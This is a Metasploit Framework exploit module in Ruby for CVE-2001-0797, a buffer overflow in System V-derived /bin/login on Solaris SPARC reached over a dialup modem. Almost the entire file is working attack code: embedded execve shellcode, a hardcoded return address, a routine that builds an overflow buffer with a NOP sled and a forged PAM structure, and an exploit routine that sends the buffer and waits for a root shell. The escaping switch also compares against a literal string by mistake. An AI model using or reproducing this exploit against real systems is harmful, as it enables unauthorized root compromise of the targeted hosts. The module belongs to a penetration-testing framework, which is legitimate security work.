##
# $Id: manyargs.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Dialup

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'System V Derived /bin/login Extraneous Arguments Buffer Overflow',
			'Description'	=> %q{
					This exploit connects to a system's modem over dialup and exploits
				a buffer overlflow vulnerability in it's System V derived /bin/login.
				The vulnerability is triggered by providing a large number of arguments.
			},
			'References'     =>
				[
					[ 'CVE', '2001-0797'],
					[ 'OSVDB', '690'],
					[ 'OSVDB', '691'],
					[ 'BID', '3681'],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2002-10/0014.html'],
					[ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2004-12/0404.html'],
				],
			'Version'	=> '$Revision: 9669 $',
			'Author'	=>
				[
					'I)ruid',
				],
			'Arch'		=> ARCH_TTY,
			'Platform'	=> ['unix'],
			'License'	=> MSF_LICENSE,
			'Payload'        =>
				{
					'Space'       => 3000,
					'BadChars'    => '',
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'Solaris 2.6 - 8 (SPARC)',
						{
							'Platform' => 'unix',
							'Ret'      => 0x00027184,
							# Solaris/SPARC special shellcode (courtesy of inode)
							# execve() + exit()
							'Shellcode' =>
								"\x94\x10\x20\x00\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc" +
								"\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8\xe0\x23\xbf\xf4" +
								"\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23\xbf\xec\x92\x23\xa0\x14" +
								"\x82\x10\x20\x3b\x91\xd0\x20\x08\x82\x10\x20\x01\x91\xd0\x20\x08",
							'NOP' => "\x90\x1b\x80\x0e",
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Dec 12 2001'))

		register_options(
			[
#				OptString.new('USER', [true, 'User to log in as', 'bin']),
			], self.class)
	end

	def buildbuf
		print_status("Targeting: #{self.target.name}")

		retaddr   = self.target.ret
		shellcode = self.target['Shellcode']
		nop       = self.target['NOP']

		user      = datastore['USER']
		command   = datastore['COMMAND'] + "\n"

		# prepare the evil buffer
		i = 0
		buf = ''

		# login name
		buf[i,4] = 'bin '
		i += 4

		# return address
		buf[i,4] = [retaddr].pack('N')
		i += 4
		buf[i,1] = ' '
		i += 1

		# trigger the overflow
		(0...60).each {|c|
			buf[i,2] = 'a '
			i += 2
		}

		# padding
		buf[i,4] = ' BBB'
		i += 4

		# nop sled and shellcode
		(0...398).each {|c|
			buf[i,nop.size] = nop
			i += nop.size
		}
		shellcode.each_byte {|b|
			c = b.chr
			case 'c'
			when "\\"
				buf[i,2] = "\\\\"
				i += 2
			when "\xff", "\n", " ", "\t"
				buf[i,1] = "\\"
				buf[i+1,1] = (((b & 0300) >> 6) + '0').chr
				buf[i+2,1] = (((b & 0070) >> 3) + '0').chr
				buf[i+3,1] = ( (b & 0007)       + '0').chr
				i += 4
			else
				buf[i,1] = c
				i += 1
			end
		}
		# TODO: need to overwrite/skip the last byte of shellcode?
		#i -= 1

		# padding
		buf[i,4] = 'BBB '
		i += 4

		# pam_handle_t: minimal header
		buf[i,16] = 'CCCCCCCCCCCCCCCC'
		i += 16
		buf[i,4] = [retaddr].pack('N')
		i += 4
		buf[i,4] = [0x01].pack('N')
		i += 4

		# pam_handle_t: NULL padding
		(0...52).each {|c|
			buf[i,4] = [0].pack('N')
			i += 4
		}

		# pam_handle_t: pameptr must be the 65th ptr
		buf[i,9] = "\x00\x00\x00 AAAA\n"
		i += 9

		return buf
	end

	def exploit
		buf = buildbuf

		print_status("Dialing Target")
		if not connect_dialup
			print_error("Exiting.")
			return
		end

		print_status("Waiting for login prompt")

		res = dialup_expect(/ogin:\s/i, 10)
		#puts Rex::Text.to_hex_dump(res[:buffer])
		if not res[:match]
			print_error("Login prompt not found... Exiting.")
			disconnect_dialup
			return
		end

		# send the evil buffer, 256 chars at a time
		print_status("Sending evil buffer...")
		#puts Rex::Text.to_hex_dump(buf)
		len = buf.length
		p = 0
		while(len > 0) do
			i = len > 0x100 ? 0x100 : len
			#puts Rex::Text.to_hex_dump(buf[p,i])
			dialup_puts(buf[p,i])
			len -= i
			p += i
#			if len > 0
#				puts Rex::Text.to_hex_dump("\x04")
#				dialup_puts("\x04") if len > 0
#			end
			select(nil,nil,nil,0.5)
		end

		# wait for password prompt
		print_status("Waiting for password prompt")
		res = dialup_expect(/assword:/i, 30)
		#puts Rex::Text.to_hex_dump(res[:buffer])
		if not res[:match]
			print_error("Target is likely not vulnerable... Exiting.")
			disconnect_dialup
			return
		end

		print_status("Password prompt received, waiting for shell")
		dialup_puts("pass\n")

		res = dialup_expect(/#\s/i, 20)
		#puts Rex::Text.to_hex_dump(res[:buffer])
		if not res[:match]
			print_error("Shell not found.")
			print_error("Target is likely not vulnerable... Exiting.")
			disconnect_dialup
			return
		end

		print_status("Success!!!")
		handler

		disconnect_dialup
	end

end
